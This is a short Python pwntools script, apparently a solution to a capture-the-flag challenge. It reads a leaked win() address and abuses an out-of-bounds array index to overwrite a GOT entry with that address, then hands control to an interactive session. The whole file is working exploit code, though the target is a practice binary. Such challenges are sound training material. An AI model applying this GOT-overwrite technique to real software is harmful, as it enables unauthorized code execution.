from pwn import *

context.arch = "amd64"
context.log_level = "info"

elf = ELF("/challenge/now-you-got-it-easy")
p = process("/challenge/now-you-got-it-easy")

win_addr = elf.sym["win"]
puts_addr = elf.got["putchar"]

offset_bytes = puts_addr - 0x57C0  # 0x57c0 是题目泄漏的 arr 相对偏移
index = offset_bytes // 8

log.info(f"Targeting puts@got. Calculated Index: {index}")

p.recvuntil(b"FREE LEAK: win is located at: ")
win_addr_str = p.recvline().strip()
win_addr = int(win_addr_str, 16)
log.info(f"Leaked win() address: {hex(win_addr)}")

p.sendlineafter(b"Which number would you like to view? ", str(index).encode())
p.sendlineafter(
    b"What number would you like to replace it with? ", str(win_addr).encode()
)

p.interactive()
